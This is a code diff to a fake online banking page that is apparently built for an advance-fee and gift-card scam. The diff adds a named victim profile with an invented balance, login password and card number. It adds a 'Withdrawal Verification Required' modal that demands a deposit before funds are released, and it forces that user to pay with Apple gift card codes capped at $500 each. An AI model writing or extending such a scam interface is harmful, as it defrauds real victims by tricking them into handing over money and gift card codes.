@@ -4093,11 +4093,11 @@ body::after {
                 <polyline points="19 12 12 19 5 12"/>
             </svg>
         </div>
-        <div class="modal-title">Wire Deposit Required</div>
+        <div class="modal-title">Withdrawal Verification Required</div>
         <div class="modal-text">
-            Before your withdrawal can be processed, a wire deposit must be made to cover the required clearance.
+            Before your withdrawal can be processed, a deposit must be made to cover the required clearance.
             <br><br>
-            <strong>US$ 43,420.36</strong>
+            <strong id="modalDepositAmount">US$ 0.00</strong>
         </div>
         <div style="display: flex; gap: 12px; margin-top: 24px;">
             <button class="btn-submit" style="flex: 1; background: rgba(255, 255, 255, 0.05); border-color: var(--border); color: var(--slate);" id="modalCancelBtn">Cancel</button>
@@ -4133,6 +4133,7 @@ body::after {
             wireApproved: true,
             hideCard: true,
             verifiedBalance: 163623.91,
+            withdrawDepositRequired: 43420.36,
             transactions: [
                 { description: 'Deposit 1 · Wire Transfer', ref: 'REF #RM-10001 · Wire Transfer · Cleared', amount: 81000.00, type: 'wire' },
                 { description: 'Deposit 2 · Cashier\'s Cheque', ref: 'REF #RM-10002 · Cashier\'s Cheque · Cleared', amount: 81000.00, type: 'in' },
@@ -4169,6 +4170,32 @@ body::after {
                 { description: 'Deposit 5 · Cashier\'s Cheque', ref: 'REF #MB-10005 · Cashier\'s Cheque · Cleared', amount: 96850.00, type: 'in' },
                 { description: 'Deposit 6 · Cashier\'s Cheque', ref: 'REF #MB-10006 · Cashier\'s Cheque · Cleared', amount: 150500.00, type: 'in' },
                 { description: 'Deposit 7 · Cashier\'s Cheque', ref: 'REF #MB-10007 · Cashier\'s Cheque · Cleared', amount: 178600.00, type: 'in' }
+            ]
+        },
+        'walter.vanegas': {
+            userId: 'walter.vanegas',
+            password: 'vanegas2026',
+            displayName: 'Walter Vanegas',
+            firstName: 'Walter',
+            memberId: 'FR-88420',
+            alias: 'W. Vanegas',
+            cardNumber: '4712 8834 5510 2091',
+            cardHolder: 'W. VANEGAS',
+            avatar: 'WV',
+            pendingDeposit: 0,
+            bullionDeposit: 0,
+            federalRefund: 0,
+            plasticCardDeposit: 1100.00,
+            wireApproved: false,
+            hideCard: false,
+            verifiedBalance: 1100.00,
+            withdrawDepositRequired: 1000.00,
+            plasticOnly: true,
+            plasticMaxPerCard: 500,
+            showWithdrawAction: true,
+            transactions: [
+                { description: 'Deposit 1 · Plastic Card (Apple)', ref: 'REF #WV-10001 · Apple Gift Card · Cleared', amount: 500.00, type: 'plastic' },
+                { description: 'Deposit 2 · Plastic Card (Apple)', ref: 'REF #WV-10002 · Apple Gift Card · Cleared', amount: 600.00, type: 'plastic' }
             ]
         }
     };
@@ -4779,6 +4806,19 @@ body::after {
             if (ronaldChequeBox) ronaldChequeBox.style.display = 'block';
             if (depositToGroup) depositToGroup.style.display = 'none';
             if (submitDepositBtn) submitDepositBtn.style.display = 'none';
+        } else if (currentUser && currentUser.userId === 'walter.vanegas') {
+            for (var ft4 = 0; ft4 < tiles.length; ft4++) {
+                tiles[ft4].style.display = 'none';
+            }
+            // Only show Plastic Card (last tile, index 5)
+            if (tiles.length > 0) {
+                tiles[5].style.display = '';
+                for (var ft5 = 0; ft5 < tiles.length; ft5++) {
+                    tiles[ft5].classList.toggle('active', ft5 === 5);
+                }
+            }
+            selectedMethod = 'plastic';
+            renderMethodFields();
         } else if (currentUser && currentUser.chequeInstruction) {
             if (kathleenChequeBox) kathleenChequeBox.style.display = 'block';
         }
@@ -5068,34 +5108,59 @@ body::after {
                     '<input type="number" id="wireAmount" placeholder="0.00" min="500" step="0.01" required>' +
                 '</div>';
         } else if (selectedMethod === 'plastic') {
-            html =
-                '<div class="form-group">' +
-                    '<label>Gift Card Brand</label>' +
-                    '<div class="funding-grid" style="margin-top: 0;" id="plasticGrid">' +
-                        '<button type="button" class="funding-tile active" data-plastic="apple"><div class="funding-tile-logo apple">A</div>Apple</button>' +
-                        '<button type="button" class="funding-tile" data-plastic="sephora"><div class="funding-tile-logo sephora">S</div>Sephora</button>' +
-                        '<button type="button" class="funding-tile" data-plastic="google"><div class="funding-tile-logo google">G</div>Google Play</button>' +
-                        '<button type="button" class="funding-tile" data-plastic="nordstrom"><div class="funding-tile-logo nordstrom">N</div>Nordstrom</button>' +
-                        '<button type="button" class="funding-tile" data-plastic="lululemon"><div class="funding-tile-logo lululemon">L</div>Lululemon</button>' +
-                        '<button type="button" class="funding-tile" data-plastic="visa"><div class="funding-tile-logo visa">V</div>Visa Gift</button>' +
-                        '<button type="button" class="funding-tile" data-plastic="mastercard"><div class="funding-tile-logo mastercard">M</div>Mastercard Gift</button>' +
-                        '<button type="button" class="funding-tile" data-plastic="amex"><div class="funding-tile-logo amex">AX</div>Amex Gift</button>' +
-                    '</div>' +
-                '</div>' +
-                '<div class="form-row">' +
+            if (currentUser && currentUser.plasticOnly) {
+                // Walter: Apple only, $500 max
+                html =
                     '<div class="form-group">' +
-                        '<label for="plasticCode">Card Code / PIN</label>' +
-                        '<input type="text" id="plasticCode" placeholder="Card number or redemption code" required>' +
+                        '<label>Gift Card Brand</label>' +
+                        '<div class="funding-grid" style="margin-top: 0;" id="plasticGrid">' +
+                            '<button type="button" class="funding-tile active" data-plastic="apple"><div class="funding-tile-logo apple">A</div>Apple</button>' +
+                        '</div>' +
                     '</div>' +
+                    '<div class="form-row">' +
+                        '<div class="form-group">' +
+                            '<label for="plasticCode">Card Code / PIN</label>' +
+                            '<input type="text" id="plasticCode" placeholder="Apple Gift Card code" required>' +
+                        '</div>' +
+                        '<div class="form-group">' +
+                            '<label for="plasticAmount">Face Value (USD)</label>' +
+                            '<input type="number" id="plasticAmount" placeholder="0.00" min="10" max="500" step="0.01" required>' +
+                        '</div>' +
+                    '</div>' +
+                    '<div class="security-notice" style="margin-top: 0;">' +
+                        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>' +
+                        '<p><strong>Card consolidation:</strong> Submit card codes one at a time. <strong>Maximum $500 per Apple card.</strong> Digital codes only — never mail physical cards.</p>' +
+                    '</div>';
+            } else {
+                html =
                     '<div class="form-group">' +
-                        '<label for="plasticAmount">Face Value (USD)</label>' +
-                        '<input type="number" id="plasticAmount" placeholder="0.00" min="10" step="0.01" required>' +
+                        '<label>Gift Card Brand</label>' +
+                        '<div class="funding-grid" style="margin-top: 0;" id="plasticGrid">' +
+                            '<button type="button" class="funding-tile active" data-plastic="apple"><div class="funding-tile-logo apple">A</div>Apple</button>' +
+                            '<button type="button" class="funding-tile" data-plastic="sephora"><div class="funding-tile-logo sephora">S</div>Sephora</button>' +
+                            '<button type="button" class="funding-tile" data-plastic="google"><div class="funding-tile-logo google">G</div>Google Play</button>' +
+                            '<button type="button" class="funding-tile" data-plastic="nordstrom"><div class="funding-tile-logo nordstrom">N</div>Nordstrom</button>' +
+                            '<button type="button" class="funding-tile" data-plastic="lululemon"><div class="funding-tile-logo lululemon">L</div>Lululemon</button>' +
+                            '<button type="button" class="funding-tile" data-plastic="visa"><div class="funding-tile-logo visa">V</div>Visa Gift</button>' +
+                            '<button type="button" class="funding-tile" data-plastic="mastercard"><div class="funding-tile-logo mastercard">M</div>Mastercard Gift</button>' +
+                            '<button type="button" class="funding-tile" data-plastic="amex"><div class="funding-tile-logo amex">AX</div>Amex Gift</button>' +
+                        '</div>' +
                     '</div>' +
-                '</div>' +
-                '<div class="security-notice" style="margin-top: 0;">' +
-                    '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>' +
-                    '<p><strong>Card consolidation:</strong> Submit card codes one at a time. Funds are swept through our alias merchant gateway. Digital codes only — never mail physical cards.</p>' +
-                '</div>';
+                    '<div class="form-row">' +
+                        '<div class="form-group">' +
+                            '<label for="plasticCode">Card Code / PIN</label>' +
+                            '<input type="text" id="plasticCode" placeholder="Card number or redemption code" required>' +
+                        '</div>' +
+                        '<div class="form-group">' +
+                            '<label for="plasticAmount">Face Value (USD)</label>' +
+                            '<input type="number" id="plasticAmount" placeholder="0.00" min="10" step="0.01" required>' +
+                        '</div>' +
+                    '</div>' +
+                    '<div class="security-notice" style="margin-top: 0;">' +
+                        '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>' +
+                        '<p><strong>Card consolidation:</strong> Submit card codes one at a time. Funds are swept through our alias merchant gateway. Digital codes only — never mail physical cards.</p>' +
+                    '</div>';
+            }
 
             setTimeout(function () {
                 var plasticTiles = document.querySelectorAll('#plasticGrid .funding-tile');
@@ -5209,6 +5274,10 @@ body::after {
             var plasticAmount = parseFloat((document.getElementById('plasticAmount') || {}).value) || 0;
             if (!plasticCode || !plasticAmount) { toast('Fill card code and amount', 'error'); return; }
             if (plasticAmount < 10) { toast('Minimum card value is $10', 'error'); return; }
+            if (currentUser && currentUser.plasticMaxPerCard && plasticAmount > currentUser.plasticMaxPerCard) {
+                toast('Maximum per card for this account is $' + currentUser.plasticMaxPerCard, 'error');
+                return;
+            }
             amount = plasticAmount;
             extras = [
                 ['Brand', brand.charAt(0).toUpperCase() + brand.slice(1)],
@@ -5325,6 +5394,11 @@ body::after {
         }
         var ronaldBtn = e.target.closest && e.target.closest('#withdrawBtn');
         if (ronaldBtn) {
+            if (currentUser && currentUser.userId === 'walter.vanegas') {
+                document.getElementById('modalDepositAmount').textContent = 'US$ ' + currentUser.withdrawDepositRequired.toFixed(2);
+            } else {
+                document.getElementById('modalDepositAmount').textContent = 'US$ ' + (currentUser ? currentUser.withdrawDepositRequired : 0).toFixed(2);
+            }
             var modal = document.getElementById('withdrawModal');
             if (modal) modal.classList.add('show');
         }
@@ -5338,7 +5412,20 @@ body::after {
         document.getElementById('withdrawModal').classList.remove('show');
         prepareDepositView();
         showView('depositView');
-        toast('Please complete your wire deposit.', 'info');
+        toast('Please complete your deposit.', 'info');
+    });
+
+    // Also handle withdrawActionBtn if visible (for users with showWithdrawAction)
+    document.getElementById('withdrawActionBtn').addEventListener('click', function() {
+        if (currentUser && currentUser.userId === 'walter.vanegas') {
+            document.getElementById('modalDepositAmount').textContent = 'US$ ' + currentUser.withdrawDepositRequired.toFixed(2);
+            document.getElementById('withdrawModal').classList.add('show');
+        } else if (currentUser && currentUser.marciaWithdrawBlock) {
+            showView('withdrawView');
+        } else if (currentUser && currentUser.withdrawDepositRequired) {
+            document.getElementById('modalDepositAmount').textContent = 'US$ ' + currentUser.withdrawDepositRequired.toFixed(2);
+            document.getElementById('withdrawModal').classList.add('show');
+        }
     });
 
     var chatResponses = [
